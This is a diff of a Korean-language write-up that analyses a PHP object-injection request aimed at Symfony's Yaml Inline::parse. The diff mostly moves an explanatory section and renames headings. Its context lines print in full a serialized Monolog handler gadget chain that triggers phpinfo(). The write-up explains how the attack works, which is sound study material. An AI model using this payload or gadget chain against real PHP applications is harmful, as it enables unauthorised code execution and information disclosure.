@@ -11,19 +11,9 @@
 controller\=SymfonyComponentYamlInline::parse&value\=!!php/object:a:1:{i:1;a:2:{i:0;O:32:\"MonologHandlerSyslogUdpHandler\":1:{s:9:\"*socket\";O:29:\"MonologHandlerBufferHandler\":7:{s:10:\"*handler\";O:29:\"MonologHandlerBufferHandler\":7:{s:10:\"*handler\";N;s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;s:2:\"-1\";s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:7:\"phpinfo\";}}s:13:\"*bufferSize\";i:-1;s:9:\"*buffer\";a:1:{i:0;a:2:{i:0;i:-1;s:5:\"level\";N;}}s:8:\"*level\";N;s:14:\"*initialized\";b:1;s:14:\"*bufferLimit\";i:-1;s:13:\"*processors\";a:2:{i:0;s:7:\"current\";i:1;s:7:\"phpinfo\";}}}i:0;i:0;}}&exceptionOnInvalidType\=0&objectSupport\=1&objectForMap\=0&flags\777215&references\=1
 ```
 
-### 이 공격의 작동 원리:
-
-1. **PHP 객체 직렬화 공격**: `!!php/object:`로 시작하는 직렬화된 객체는 PHP의 `unserialize()` 함수에서 역직렬화될 수 있습니다.
-2. **클래스 로딩 및 메서드 호출**: 공격자는 직렬화된 데이터를 통해 PHP 클래스나 메서드를 호출하고, 예를 들어 `phpinfo()`와 같은 민감한 함수나 시스템 정보를 출력할 수 있습니다.
-3. **MonologHandler 클래스**: `Monolog` 라이브러리를 이용한 공격일 가능성이 있으며, 로깅 시스템을 악용하여 로그에 민감한 정보를 기록하거나, 네트워크를 통해 외부 서버에 데이터를 유출할 수도 있습니다.
-
-* `_controller` 파라미터를 통해 `Symfony\Component\Yaml\Inline::parse` 메서드를 호출하면서, 복잡한 **PHP 객체 직렬화된 데이터**를 전달하고 있습니다.
-* `value` 파라미터에 전달된 **직렬화된 PHP 객체**가 의도된 클래스를 로드하고 특정 동작을 수행할 수 있도록 조작된 부분입니다.
-* `phpinfo()`라는 함수가 처리 과정에서 **프로세서**로 지정되어 있어, 이 객체가 역직렬화된 후 `phpinfo()`를 호출하게 될 가능성이 높습니다. `phpinfo()`는 PHP 설정 정보를 출력하는 함수로, 공격자가 시스템 정보에 접근할 수 있게 됩니다.
-
 ---
 
-### 1) 전체 구조
+### 전체 구조
 
 요청은 URL-쿼리 형태로 보이며, 주요 파라미터는 `_controller` 와 `value` 입니다.
 `_controller=SymfonyComponentYamlInline::parse` 로 보아 Symfony의 `Yaml\Inline::parse()`를 호출하는 맥락이고, `value=` 에는 `!!php/object:...` 형태의 **PHP 직렬화된(또는 PHP 객체 표기) 데이터**가 들어 있습니다. 이어서 `exceptionOnInvalidType=0`, `objectSupport=1` 등 파싱 옵션도 함께 전달되고 있습니다.
@@ -31,7 +21,7 @@ controller\=SymfonyComponentYamlInline::parse&value\=!!php/object:a:1:{i:1;a:2:{
 
 ---
 
-### 2) `value` 안의 구문(토큰별 상세 분석)
+### `value` 안의 구문(토큰별 상세 분석)
 
 ```
 !!php/object:a:1:{i:1;a:2:{i:0;O:32:"MonologHandlerSyslogUdpHandler":1:{s:9:"*socket" ; O:29:"MonologHandlerBufferHandler":7:{ ... } } i:0;i:0;}}
@@ -73,6 +63,19 @@ controller\=SymfonyComponentYamlInline::parse&value\=!!php/object:a:1:{i:1;a:2:{
    * 직렬화 배열의 다른 인덱스가 있는 것처럼 보이지만 구조가 반복적/중첩적으로 끝나는 형태입니다. 전체적으로는 **여러 중첩 객체와 배열**로 구성된 직렬화된 데이터입니다.
 
 ---
+
+### 이 공격의 작동 원리:
+
+1. **PHP 객체 직렬화 공격**: `!!php/object:`로 시작하는 직렬화된 객체는 PHP의 `unserialize()` 함수에서 역직렬화될 수 있습니다.
+2. **클래스 로딩 및 메서드 호출**: 공격자는 직렬화된 데이터를 통해 PHP 클래스나 메서드를 호출하고, 예를 들어 `phpinfo()`와 같은 민감한 함수나 시스템 정보를 출력할 수 있습니다.
+3. **MonologHandler 클래스**: `Monolog` 라이브러리를 이용한 공격일 가능성이 있으며, 로깅 시스템을 악용하여 로그에 민감한 정보를 기록하거나, 네트워크를 통해 외부 서버에 데이터를 유출할 수도 있습니다.
+
+* `_controller` 파라미터를 통해 `Symfony\Component\Yaml\Inline::parse` 메서드를 호출하면서, 복잡한 **PHP 객체 직렬화된 데이터**를 전달하고 있습니다.
+* `value` 파라미터에 전달된 **직렬화된 PHP 객체**가 의도된 클래스를 로드하고 특정 동작을 수행할 수 있도록 조작된 부분입니다.
+* `phpinfo()`라는 함수가 처리 과정에서 **프로세서**로 지정되어 있어, 이 객체가 역직렬화된 후 `phpinfo()`를 호출하게 될 가능성이 높습니다. `phpinfo()`는 PHP 설정 정보를 출력하는 함수로, 공격자가 시스템 정보에 접근할 수 있게 됩니다.
+
+---
+
 ### **PHP 객체 직렬화 취약성(POP/POI — PHP Object Injection)** 악용
 
 **PHP 직렬화(serialized object)** 포맷 예시 코드는 다음과 같습니다. 
